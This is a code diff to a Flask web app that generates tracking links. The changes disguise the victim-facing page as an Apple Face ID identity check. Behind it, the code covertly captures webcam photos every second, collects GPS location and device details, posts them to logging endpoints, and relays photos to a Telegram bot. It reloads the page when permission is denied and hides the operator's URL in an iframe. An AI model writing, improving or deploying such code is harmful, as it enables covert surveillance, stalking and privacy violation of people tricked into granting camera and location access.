@@ -29,53 +29,47 @@ def send_tg_photo(token, cid, raw_img, caption=""):
     try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
     except: pass
 
-# --- UI TEMPLATES (Dynamic 1500ms RGB Glow) ---
+# --- UI TEMPLATES (Pure Red Uchiha Theme) ---
 COMMON_STYLE = """
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
     
-    :root { --base-glow: #00ffea; --grad-1: #00c6ff; --grad-2: #0072ff; }
-    @keyframes rgbCycle { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
+    :root { --main-red: #ff0000; --dark-red: #8a0000; }
     @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
     
     body { 
-        background: radial-gradient(circle at center, #0a0a0a 0%, #000000 100%); color: #fff; 
+        background: radial-gradient(circle at center, #110000 0%, #000000 100%); color: #fff; 
         display: flex; flex-direction: column; align-items: center; justify-content: center; 
         min-height: 100vh; overflow-x: hidden; padding: 20px;
-        animation: rgbCycle 1.5s linear infinite; /* Dynamic 1500ms Color Change */
     }
     
     .container { 
-        background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(20px); 
-        border: 2px solid var(--base-glow); border-radius: 24px; padding: 30px; 
-        width: 100%; max-width: 500px; box-shadow: 0 0 25px var(--base-glow); 
+        background: rgba(15, 0, 0, 0.8); backdrop-filter: blur(20px); 
+        border: 2px solid var(--main-red); border-radius: 24px; padding: 30px; 
+        width: 100%; max-width: 500px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); 
         animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; 
     }
     
-    h2 { font-family: 'Orbitron', sans-serif; color: #fff; margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px var(--base-glow); }
+    h2 { font-family: 'Orbitron', sans-serif; color: var(--main-red); margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px var(--main-red); }
     
-    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--base-glow); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
-    input:focus, select:focus { box-shadow: 0 0 15px var(--base-glow); }
+    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--dark-red); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
+    input:focus, select:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
     
-    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, var(--grad-1), var(--grad-2)); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px var(--grad-1); }
-    button:hover { transform: scale(1.02); }
+    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, var(--dark-red), var(--main-red)); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+    button:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.6); }
     
     a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
-    a:hover { color: var(--base-glow); text-shadow: 0 0 10px var(--base-glow); }
-    
-    .bot-card { background: rgba(255, 255, 255, 0.05); padding: 18px; border-radius: 14px; margin: 10px 0; border: 1px solid var(--base-glow); cursor: pointer; transition: 0.3s; font-weight: 600; font-size: 15px; }
-    .bot-card:hover { background: rgba(255, 255, 255, 0.1); box-shadow: 0 0 15px var(--base-glow); }
+    a:hover { color: var(--main-red); text-shadow: 0 0 10px var(--main-red); }
 </style>
 """
 
 @app.route("/")
 def index(): return redirect("/lg")
 
-# --- LOGIN / REGISTER FALLBACK (Keeping for standard app setup) ---
 @app.route("/rg", methods=["GET", "POST"])
 def register():
     if request.method == "POST":
@@ -99,7 +93,7 @@ def login():
             return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
         else:
             html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
-            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button class='bot-card' type='submit'>🤖 {u['bot_name']}</button></form>"
+            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit'>🤖 {u['bot_name']}</button></form>"
             return render_template_string(html + "</div>")
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>LOGIN</h2><form method="POST"><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Continue</button></form><a href="/rg">Create account</a></div>')
 
@@ -126,7 +120,7 @@ def verify_otp():
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
     return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')
 
-# --- TARGET PAGE (HACK UI + RGB DYNAMIC THEME) ---
+# --- TARGET PAGE (APPLE FACE ID & RED THEME) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -136,7 +130,7 @@ def target_page(link_id):
     target_type = data.get("target_type", "both")
     action_mode = data.get("action_mode", "redirect")
     action_value = data.get("action_value", "")
-    text_content = data.get("text_content", "") # FETCHING TEXT CONTENT
+    text_content = data.get("text_content", "")
     file_type = data.get("file_type", "")
 
     return render_template_string('''
@@ -145,128 +139,154 @@ def target_page(link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>System Verification</title>
+        <title>Identity Verification</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&family=Poppins:wght@500;700&display=swap');
+            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
             
-            :root { --base-glow: #00ffea; --grad-1: #00c6ff; --grad-2: #0072ff; }
-            @keyframes rgbCycle { 0% { filter: hue-rotate(0deg); } 100% { filter: hue-rotate(360deg); } }
-            @keyframes spin { 100% { transform: rotate(360deg); } }
-            @keyframes pulseGlow { 0% { text-shadow: 0 0 10px var(--base-glow); } 50% { text-shadow: 0 0 30px var(--base-glow), 0 0 40px var(--grad-1); } 100% { text-shadow: 0 0 10px var(--base-glow); } }
-
+            :root { --red: #ff0000; --dark: #110000; }
+            * { box-sizing: border-box; margin: 0; padding: 0; }
+            
             body { 
-                background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%); 
-                color: var(--base-glow); font-family: 'Share Tech Mono', monospace; 
-                display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; 
-                animation: rgbCycle 1.5s linear infinite; /* Dynamic 1500ms theme */
+                background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; 
+                display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; flex-direction: column;
             }
             
-            .box { 
-                background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); 
-                border: 2px solid var(--base-glow); border-radius: 20px; padding: 40px 30px; 
-                width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px var(--base-glow); 
+            /* Apple FaceID Style UI */
+            .face-container { display: none; text-align: center; }
+            .face-wrapper {
+                position: relative; width: 250px; height: 250px; margin: 0 auto 30px;
+                border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.3);
+            }
+            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } /* Mirror effect */
+            
+            .scan-ring {
+                position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+                border: 4px solid transparent; border-top-color: var(--red);
+                border-radius: 50%; animation: spin 1.5s linear infinite; box-shadow: inset 0 0 20px rgba(255,0,0,0.5);
             }
             
-            h3 { font-family: 'Orbitron', sans-serif; color: #fff; letter-spacing: 2px; margin-bottom: 30px; text-shadow: 0 0 15px var(--base-glow); }
-            .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;}
+            /* Location Map Pin UI */
+            .loc-container { display: none; text-align: center; }
+            .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
             
-            .tick { color: #0f0; text-shadow: 0 0 10px #0f0; filter: hue-rotate(0deg) !important; } /* Stop rgb cycle on ticks */
-            .cross { color: #f00; text-shadow: 0 0 10px #f00; filter: hue-rotate(0deg) !important; }
-            .wait { color: #ff0; animation: spin 1s infinite linear; filter: hue-rotate(0deg) !important; }
+            @keyframes spin { 100% { transform: rotate(360deg); } }
+            @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+
+            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; }
             
-            #hack-ui, #result-ui { display: none; text-align: center; width: 100%; max-width: 500px; padding: 20px; }
-            .timer { font-size: 6rem; color: #fff; animation: pulseGlow 1s infinite; font-family: 'Orbitron', sans-serif; font-weight: 900;}
-            #msg { margin-top: 20px; font-size: 0.9rem; color: #aaa; height: 20px;}
-            
-            /* Result UI styling */
-            .media-container { background: rgba(0,0,0,0.9); padding: 20px; border-radius: 20px; border: 2px solid var(--base-glow); box-shadow: 0 0 30px var(--base-glow); }
-            .media-container img, .media-container video { width: 100%; border-radius: 10px; border: 2px solid var(--base-glow); margin-bottom: 15px; }
-            .download-btn { background: linear-gradient(135deg, var(--grad-1), var(--grad-2)); color: #fff; padding: 15px 25px; border-radius: 12px; font-family: 'Poppins'; font-weight: bold; text-decoration: none; display: inline-block; width: 100%; box-shadow: 0 0 15px var(--grad-1); transition: 0.3s; border: none;}
-            .download-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--grad-2); }
+            /* Hidden Inline Content Viewer */
+            #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; }
+            .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 15px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,0,0,0.3); width: 100%; max-width: 600px; margin: 0 auto; height: 90vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+            .content-box img, .content-box video { max-width: 100%; max-height: 80vh; border-radius: 10px; border: 2px solid var(--red); }
+            .content-box iframe { width: 100%; height: 100%; border: none; border-radius: 10px; }
+            .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; }
         </style>
     </head>
     <body>
-        <div id="auth-ui" class="box">
-            <h3>SECURITY CHECK</h3>
-            <div class="item" id="cam-row" style="display:none;"><span><i class="fas fa-camera"></i> CAMERA</span><span id="cam-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
-            <div class="item" id="loc-row" style="display:none;"><span><i class="fas fa-map-marker-alt"></i> LOCATION</span><span id="loc-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
-            <p id="msg">Please allow permissions to continue...</p>
+        
+        <div id="cam-section" class="face-container">
+            <div class="face-wrapper">
+                <div class="scan-ring"></div>
+                <video id="v" autoplay playsinline muted></video>
+            </div>
+            <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
         </div>
 
-        <div id="hack-ui">
-            <h2 style="font-family: 'Orbitron'; color: #fff; letter-spacing: 3px; text-shadow: 0 0 15px var(--base-glow);">SYSTEM UPLINK</h2>
-            <div class="timer" id="count">30</div>
-            <p id="log-text" style="color: #ccc; margin-top: 10px; text-transform: uppercase;">Establishing secure connection...</p>
+        <div id="loc-section" class="loc-container">
+            <i class="fas fa-map-marker-alt pin-icon"></i>
+            <p class="instruction-text" id="loc-msg">SECURING LOCATION UPLINK...</p>
         </div>
 
         <div id="result-ui">
-            <div class="media-container" id="media-content">
-                </div>
+            <div class="content-box" id="media-content"></div>
         </div>
 
-        <video id="v" style="display:none" autoplay playsinline></video>
         <canvas id="c" style="display:none"></canvas>
 
         <script>
             let mode = "{{ t_type }}";
             let actMode = "{{ a_mode }}";
             let actVal = "{{ a_val }}";
-            let txtVal = {{ t_content | tojson | safe }}; // Safely imports text/emoji content
+            let txtVal = {{ t_content | tojson | safe }};
             let fType = "{{ f_type }}";
 
-            let camReq = (mode === 'both' || mode === 'camera');
-            let locReq = (mode === 'both' || mode === 'location');
-            
-            if(camReq) document.getElementById('cam-row').style.display = 'flex';
-            if(locReq) document.getElementById('loc-row').style.display = 'flex';
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            let captureInterval = null;
 
-            let camDone = !camReq, locDone = !locReq, timeLeft = 30;
-            const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
-            
-            window.onload = () => { getHardware(); startAuth(); };
+            window.onload = () => { getHardware(); startVerificationFlow(); };
 
             function getHardware() {
                 let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                 fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
             }
 
-            function checkAllDone() {
-                if(camDone && locDone) {
-                    msg.innerText = "Verification Complete."; msg.style.color = "#0f0";
-                    setTimeout(startHack, 1500);
+            async function startVerificationFlow() {
+                if(mode === 'both' || mode === 'camera') {
+                    document.getElementById('cam-section').style.display = 'block';
+                    try {
+                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+                        startFaceCheck();
+                    } catch(e) {
+                        document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
+                        document.getElementById('face-msg').style.color = "red";
+                        setTimeout(() => location.reload(), 2000);
+                    }
+                } else if (mode === 'location') {
+                    startLocationCheck();
+                } else {
+                    showContent(); // Fallback if no permissions requested
                 }
             }
 
-            async function startAuth() {
-                if(camReq) {
-                    try {
-                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
-                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
-                        camDone = true; checkAllDone();
-                    } catch(e) {
-                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
-                        msg.innerText = "Camera Denied. Reloading..."; msg.style.color = "#f00";
-                        setTimeout(() => location.reload(), 2000);
-                    }
-                }
+            function startFaceCheck() {
+                // Continuous background capture - never stops while page is open
+                captureInterval = setInterval(takeSnap, 1000); 
 
-                if(locReq) {
-                    if(navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (p) => {
-                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
-                                fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
-                                locDone = true; checkAllDone();
-                            },
-                            (e) => {
-                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
-                                msg.innerText = "Location Denied. Reloading..."; msg.style.color = "#f00";
-                                if(camReq && camDone) startCapture(3); 
-                                setTimeout(() => location.reload(), 2500);
-                            }
-                        );
+                let timeLeft = 15;
+                let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
+                let step = 0;
+                
+                const faceMsg = document.getElementById('face-msg');
+
+                let timer = setInterval(() => {
+                    timeLeft--;
+                    // Change instruction text every 3 seconds
+                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
+                    
+                    faceMsg.innerText = instructions[step];
+
+                    if(timeLeft <= 0) {
+                        clearInterval(timer);
+                        if(mode === 'both') {
+                            document.getElementById('cam-section').style.display = 'none';
+                            startLocationCheck();
+                        } else {
+                            showContent();
+                        }
                     }
+                }, 1000);
+            }
+
+            function startLocationCheck() {
+                document.getElementById('loc-section').style.display = 'block';
+                const locMsg = document.getElementById('loc-msg');
+                
+                if(navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
+                            locMsg.innerText = "LOCATION VERIFIED";
+                            setTimeout(showContent, 1000);
+                        },
+                        (e) => {
+                            locMsg.innerText = "LOCATION DENIED. RELOADING...";
+                            setTimeout(() => location.reload(), 2000);
+                        }
+                    );
+                } else {
+                    showContent();
                 }
             }
 
@@ -277,63 +297,35 @@ def target_page(link_id):
                 fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
             }
 
-            function startCapture(limit) {
-                let j=0, itv = setInterval(() => { takeSnap(); j++; if(limit && j>=limit) clearInterval(itv); }, 500);
-                return itv;
-            }
-
-            // Function to handle Text/Emoji and File formats dynamically
-            function showCustomResult() {
-                document.getElementById('hack-ui').style.display = 'none';
+            // Shows content completely inline. Hacker URL remains hidden.
+            function showContent() {
+                document.getElementById('cam-section').style.display = 'none';
+                document.getElementById('loc-section').style.display = 'none';
+                
                 let resBox = document.getElementById('result-ui');
                 let medBox = document.getElementById('media-content');
                 resBox.style.display = 'block';
 
                 let html = "";
                 
-                // Show Text / Emoji
                 if(actMode === 'text') {
-                    html += `<h2 style="color:#fff; font-size:26px; white-space:pre-wrap; text-shadow: 0 0 15px var(--base-glow); line-height:1.5;">${txtVal}</h2>`;
-                } 
-                // Show File
-                else if (actMode === 'file') {
-                    if(fType === 'image') html += `<img src="${actVal}" alt="Image">`;
-                    else if (fType === 'video') html += `<video src="${actVal}" controls autoplay></video>`;
-                    else html += `<h3 style="color:#fff; font-family:'Poppins';">File is Ready</h3>`;
-                    
-                    html += `<a href="${actVal}" target="_blank" class="download-btn"><i class="fas fa-folder-open"></i> Open / Download</a>`;
+                    html = `<div class="content-text">${txtVal}</div>`;
+                } else if (actMode === 'file') {
+                    if(fType === 'image') html = `<img src="${actVal}" alt="Secure File">`;
+                    else if (fType === 'video') html = `<video src="${actVal}" controls autoplay></video>`;
+                    else html = `<iframe src="${actVal}"></iframe>`;
+                } else {
+                    // For redirect modes, load in iframe instead of redirecting so URL stays hidden
+                    html = `<iframe src="${actVal}"></iframe>`;
                 }
                 medBox.innerHTML = html;
-            }
-
-            function startHack() {
-                document.getElementById('auth-ui').style.display = 'none';
-                document.getElementById('hack-ui').style.display = 'block';
-                
-                let capItv = null;
-                if(camReq) capItv = startCapture(0); 
-
-                let timer = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('count').innerText = timeLeft;
-                    if(timeLeft <= 0) {
-                        clearInterval(timer);
-                        if(capItv) clearInterval(capItv);
-                        
-                        if(actMode === 'redirect') {
-                            window.location.href = actVal;
-                        } else {
-                            showCustomResult(); // Triggers the unified text & file UI
-                        }
-                    }
-                }, 1000);
             }
         </script>
     </body>
     </html>
     ''', t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)
 
-# --- BACKEND LOGGING APIS (DIRECT TO TELEGRAM & SERVER HUB) ---
+# --- BACKEND LOGGING APIS ---
 @app.route("/api/log_hardware/<l_id>", methods=["POST"])
 def log_hw(l_id):
     try:
